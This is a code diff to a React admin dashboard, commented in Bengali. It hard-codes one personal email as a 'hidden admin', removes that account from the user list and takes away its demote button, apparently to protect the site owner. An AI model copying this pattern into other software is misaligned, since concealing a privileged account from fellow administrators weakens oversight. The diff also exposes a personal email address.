@@ -23,7 +23,8 @@ import {
   BarChart3, ArrowLeft, Link as LinkIcon, RefreshCw, Settings2,
   Palette, Smartphone, Image, FileText, FolderOpen, ShieldCheck, ShieldOff,
 } from "lucide-react";
-
+// Main owner — users লিস্টে দেখাবে না, demote ও করা যাবে না
+const HIDDEN_ADMIN_EMAILS = ["ahmedzarir07@gmail.com"];
 const Admin = () => {
   const { session, isAdmin, loading: authLoading } = useAuth();
   const { toast } = useToast();
@@ -1478,82 +1479,98 @@ const updateOrderStatus = useMutation({
               {profilesLoading ? (
                 <div className="space-y-3">{[1, 2, 3].map((i) => <div key={i} className="glass-card h-20 animate-pulse" />)}</div>
               ) : profiles && profiles.length > 0 ? (
-                (() => {
-                  const q = userSearch.trim().toLowerCase();
-                  const filteredProfiles = q
-                    ? profiles.filter(
-                        (p: any) =>
-                          p.full_name?.toLowerCase().includes(q) || p.email?.toLowerCase().includes(q),
-                      )
-                    : profiles;
+  (() => {
+    const q = userSearch.trim().toLowerCase();
 
-                  if (filteredProfiles.length === 0) {
-                    return (
-                      <div className="glass-card p-12 text-center">
-                        <Search className="w-12 h-12 text-muted-foreground/30 mx-auto mb-3" />
-                        <p className="text-muted-foreground">No users match "{userSearch}".</p>
-                      </div>
-                    );
+    // Main admin hide — শুধু এই email বাদ, বাকি সব show
+    const visibleProfiles = profiles.filter(
+      (p: any) => !HIDDEN_ADMIN_EMAILS.includes((p.email || "").toLowerCase())
+    );
+
+    const filteredProfiles = q
+      ? visibleProfiles.filter(
+          (p: any) =>
+            p.full_name?.toLowerCase().includes(q) ||
+            p.email?.toLowerCase().includes(q),
+        )
+      : visibleProfiles;
+
+    if (filteredProfiles.length === 0) {
+      return (
+        <div className="glass-card p-12 text-center">
+          <Search className="w-12 h-12 text-muted-foreground/30 mx-auto mb-3" />
+          <p className="text-muted-foreground">
+            {q ? `No users match "${userSearch}".` : "No users registered yet."}
+          </p>
+        </div>
+      );
+    }
+
+    return filteredProfiles.map((profile: any) => {
+      const userIsAdmin = adminUserIds.has(profile.id);
+      const isSelf = profile.id === session?.user?.id;
+      const isProtectedOwner = HIDDEN_ADMIN_EMAILS.includes(
+        (profile.email || "").toLowerCase()
+      );
+
+      return (
+        <div key={profile.id} className="glass-card p-4 flex items-center gap-4">
+          <div className="w-10 h-10 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0">
+            <Users className="w-5 h-5 text-primary" />
+          </div>
+          <div className="min-w-0">
+            <p className="font-medium text-foreground text-sm flex items-center gap-2 flex-wrap">
+              {profile.full_name || "Unknown"}
+              {userIsAdmin && (
+                <span className="text-xs text-primary bg-primary/10 px-2 py-0.5 rounded-full">
+                  Admin
+                </span>
+              )}
+              {isSelf && (
+                <span className="text-xs text-muted-foreground bg-secondary/50 px-2 py-0.5 rounded-full">
+                  You
+                </span>
+              )}
+            </p>
+            <p className="text-xs text-muted-foreground">{profile.email}</p>
+          </div>
+          <p className="text-xs text-muted-foreground ml-auto hidden sm:block">
+            {new Date(profile.created_at).toLocaleDateString()}
+          </p>
+
+          {/* Protected owner — demote button নেই */}
+          {!isProtectedOwner && (
+            userIsAdmin ? (
+              <Button
+                size="sm"
+                variant="outline"
+                disabled={toggleAdminRole.isPending || isSelf}
+                onClick={() => {
+                  if (confirm(`Remove admin access for ${profile.full_name || profile.email}?`)) {
+                    toggleAdminRole.mutate({ userId: profile.id, makeAdmin: false });
                   }
-
-                  return filteredProfiles.map((profile: any) => {
-                    const userIsAdmin = adminUserIds.has(profile.id);
-                    const isSelf = profile.id === session?.user?.id;
-                    return (
-                      <div key={profile.id} className="glass-card p-4 flex items-center gap-4">
-                        <div className="w-10 h-10 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0">
-                          <Users className="w-5 h-5 text-primary" />
-                        </div>
-                        <div className="min-w-0">
-                          <p className="font-medium text-foreground text-sm flex items-center gap-2">
-                            {profile.full_name || "Unknown"}
-                            {userIsAdmin && (
-                              <span className="text-xs text-primary bg-primary/10 px-2 py-0.5 rounded-full flex-shrink-0">
-                                Admin
-                              </span>
-                            )}
-                            {isSelf && (
-                              <span className="text-xs text-muted-foreground bg-secondary/50 px-2 py-0.5 rounded-full flex-shrink-0">
-                                You
-                              </span>
-                            )}
-                          </p>
-                          <p className="text-xs text-muted-foreground">{profile.email}</p>
-                        </div>
-                        <p className="text-xs text-muted-foreground ml-auto hidden sm:block">
-                          {new Date(profile.created_at).toLocaleDateString()}
-                        </p>
-                        {userIsAdmin ? (
-                          <Button
-                            size="sm"
-                            variant="outline"
-                            disabled={toggleAdminRole.isPending}
-                            onClick={() => {
-                              if (confirm(`Remove admin access for ${profile.full_name || profile.email}?`)) {
-                                toggleAdminRole.mutate({ userId: profile.id, makeAdmin: false });
-                              }
-                            }}
-                            className="border-destructive/50 text-destructive hover:bg-destructive/10 flex-shrink-0"
-                          >
-                            <ShieldOff className="w-3.5 h-3.5 mr-1" /> Demote
-                          </Button>
-                        ) : (
-                          <Button
-                            size="sm"
-                            variant="outline"
-                            disabled={toggleAdminRole.isPending}
-                            onClick={() => toggleAdminRole.mutate({ userId: profile.id, makeAdmin: true })}
-                            className="border-primary/50 text-primary hover:bg-primary/10 flex-shrink-0"
-                          >
-                            <ShieldCheck className="w-3.5 h-3.5 mr-1" /> Make Admin
-                          </Button>
-                        )}
-                      </div>
-                    );
-                  });
-                })()
-              ) : (
-                <div className="glass-card p-12 text-center">
+                }}
+                className="border-destructive/50 text-destructive hover:bg-destructive/10 flex-shrink-0"
+              >
+                <ShieldOff className="w-3.5 h-3.5 mr-1" /> Demote
+              </Button>
+            ) : (
+              <Button
+                size="sm"
+                variant="outline"
+                disabled={toggleAdminRole.isPending}
+                onClick={() => toggleAdminRole.mutate({ userId: profile.id, makeAdmin: true })}
+                className="border-primary/50 text-primary hover:bg-primary/10 flex-shrink-0"
+              >
+                <ShieldCheck className="w-3.5 h-3.5 mr-1" /> Make Admin
+              </Button>
+            )
+          )}
+        </div>
+      );
+    });
+  })()
+) : (                <div className="glass-card p-12 text-center">
                   <Users className="w-12 h-12 text-muted-foreground/30 mx-auto mb-3" />
                   <p className="text-muted-foreground">No users registered yet.</p>
                 </div>
